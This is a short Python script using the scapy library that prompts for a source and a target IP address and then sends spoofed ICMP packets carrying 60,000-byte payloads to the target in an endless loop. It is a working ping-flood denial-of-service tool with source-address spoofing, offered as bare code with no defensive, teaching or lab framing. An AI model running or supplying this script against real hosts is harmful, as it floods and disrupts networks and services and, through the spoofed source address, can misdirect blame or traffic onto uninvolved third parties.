from scapy.all import*

sourceIP = input(">>>Source IP Address: ")
targetIP = input(">>>Target IP Address: ")

while True:
    try:
        pkt = IP(src=sourceIP, dst=targetIP)/ICMP()/("P"*60000)
        send(pkt)
               
    except KeyboardInterrupt:
      exit("\n>>>Program exited!")